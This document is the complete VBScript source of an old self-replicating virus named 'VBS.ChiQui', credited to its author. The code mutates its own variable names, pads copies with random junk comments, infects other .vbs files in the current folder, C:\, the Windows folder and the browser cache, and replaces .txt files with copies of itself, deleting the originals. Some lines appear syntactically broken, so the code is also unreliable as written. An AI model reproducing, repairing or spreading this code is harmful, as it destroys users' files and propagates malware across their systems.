'VBS.ChiQui
'By $MOOTHiE Da HuStla [Zer0Gravity]
'10.7.00
'Dedicated to my wife ChiQui :)

'start
Randomize: On Error Resume Next
Set CCYNF = CreateObject("Scripting.FileSystemObject")
Set FTU = CCYNF.GetFolder(".")
HXWPDI = Wscript.ScriptFullName

Set IWHSC = CCYNF.OpenTextFile(WScript.ScriptFullName, 1)
OCFP = IWHSC.ReadAll
DMLBU = "CCYNF IWHSC OCFP DMLBU HKRC QRQQE GHIV QUPXOQ OONRKL NPQWJS YEIC FCT LGTFF UAJTC JNEDSW GPWVM CVN HXWPDI FTU QJRKM WFMRP IQE PFIXL BXDSV PWUU Bob BobFolder"
Do
QRQQE = Left(DMLBU, InStr(DMLBU, Chr(32)) - 1)
DMLBU = Mid(DMLBU, InStr(DMLBU, Chr(32)) + 1)

GHIV = Chr(Int(Rnd*25)+65)
For UAJTC = 1 to int(rnd*4)+2
GHIV = GHIV & Chr(Int(Rnd*25)+65)
Next

Do
QUPXOQ = InStr(QUPXOQ + 1, OCFP, QRQQE)
If QUPXOQ Then OCFP = Mid(OCFP, 1, (QUPXOQ - 1)) & GHIV & Mid(OCFP, (QUPXOQ + Len(QRQQE)))
Loop While QUPXOQ
Loop While DMLBU <> ""
Set IWHSC = CCYNF.OpenTextFile(WScript.ScriptFullName, 2, True) '
IWHSC.WriteLine OCFP
IWHSC.Close

For UAJTC = 1 to 3
Call WFMRP
Next
Call WFMRP3
Call WFMRP2

Private Sub WFMRP()
NPQWJS = Chr(Int(Rnd*25)+65)
For GPWVM = 1 to Int(Rnd*4)
NPQWJS = NPQWJS & Chr(Int(Rnd*25)+65)
Next

Set CVN = CCYNF.OpenTextFile(HXWPDI,1)
Set QJRKM = CCYNF.CreateTextFile (FTU & Chr(92) & NPQWJS & Chr(46) & Chr(118) & Chr(98) & Chr(115), True)

For JNEDSW = 1 to Int(Rnd*30) + 10
YEIC = "'"
For GPWVM = 1 to Int(Rnd*30)+1
YEIC = YEIC & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20)
Next
QJRKM.WriteLine YEIC
Next

Do Until InStr(1,FCT,Chr(39) & Chr(101) & Chr(110) & Chr(100))
FCT = CVN.ReadLine
If InStr(1, FCT, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) then LGTFF = true
YEIC = "'"
For JNEDSW = 1 to int(rnd*30) + 1
YEIC = YEIC & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20)
Next
If LGTFF = True Then
If Len(FCT) >= 900 CVCJ = Mid(FCT, 1, 500)
QJRKM.WriteLine FCT & YEIC
End If
Loop
CVN.Close

For JNEDSW = 1 to int(rnd*30) + 10
YEIC = "'"
For GPWVM = 1 to int(rnd*30)+1
YEIC = YEIC & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20)
Next
QJRKM.WriteLine YEIC
Next
QJRKM.Close
End Sub

Private Sub WFMRP3()
For YEIC = 0 to 3
If YEIC = 0 then YEICZ = CCYNF.GetFolder(".")
If YEIC = 1 Then YEICZ = "C:\"
If YEIC = 2 Then YEICZ = "C:\Windows\"
If YEIC = 3 Then YEICZ = "C:\WINDOWS\Temporary Internet Files"

For YEICX = 1 to CCYNF.GetFolder(YEICZ).SubFolders.Count
For Each IQE1 In YEICZ.Files
If Ucase(CCYNF.GetExtensionName(IQE1.Name)) = Chr(86) & Chr(66) & Chr(83) Then
Set BXDSV = CCYNF.OpenTextFile(IQE1, 1)
PFIXL = BXDSV.ReadAll
BXDSV.Close
If InStr(1, PFIXL, Chr(39) & Chr(101) & Chr(110) & Chr(100)) & InStr(1, PFIXL, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) Then YEICA = True Else YEICA = False
If YEICA = False Then
Set BXDSV = CCYNF.OpenTextFile(IQE1, 2)
For QFUH = 1 to Int(Rnd*30) + 10
IQE = "'"
For UCL = 1 to Int(Rnd*30)+1
IQE = IQE & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20)
Next
BXDSV.WriteLine IQE
Next

Set PWUU=CCYNF.OpenTextFile(HXWPDI,1)
Do Until InStr(1,CVCJ,Chr(39) & Chr(101) & Chr(110) & Chr(100))
CVCJ = PWUU.ReadLine
If InStr(1, CVCJ, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) then WCEHMF = True
IQE = "'"
For QFUH = 1 to int(rnd*30) + 1
IQE = IQE & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20) & Chr(Int(Rnd*235)+20)
Next
If WCEHMF = True Then
If Len(CVCJ) >= 900 CVCJ = Mid(CVCJ, 1, 500)
BXDSV.WriteLine CVCJ & IQE
End If
Loop
PWUU.Close

BXDSV.WriteLine PFIXL

For QFUH = 1 to int(rnd*30) + 10
IQE = "'"
For UCL = 1 to int(rnd*30)+1
IQE = IQE & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20)
Next
BXDSV.WriteLine IQE
Next
BXDSV.Close
End If
End If
Next
Next
Next
End Sub

Private Sub WFMRP()
Set IWHSC = CCYNF.OpenTextFile(HXWPDI, 1)
OCFP = IWHSC.ReadAll
IWHSC.Close

For YEIC = 0 to 3
If YEIC = 0 then IQE = CCYNF.GetFolder(".")
If YEIC = 1 Then IQE = "C:\"
If YEIC = 2 Then IQE = "C:\Windows\"
If YEIC = 3 Then IQE = "C:\WINDOWS\Temporary Internet Files"

	For Each IQE2 In CCYNF.GetFolder(IQE).SubFolders
Set UCL = IQE2.Files
		For Each BXDSV In UCL
If Ucase(CCYNF.GetExtensionName(BXDSV.Name)) = Chr(84) & Chr(88) & Chr(84) Then
Set JNEDSW99 = CCYNF.GetFile(BXDSV.Name)
Set JNEDSWc = CCYNF.CreateTextFile(BXDSV.Name & Chr(46) & Chr(118) & Chr(98) & Chr(115))
JNEDSWc.WriteLine OCFP
JNEDSWc.Close
JNEDSW99.Delete
End If
Next
Next
Next
End Sub
'end
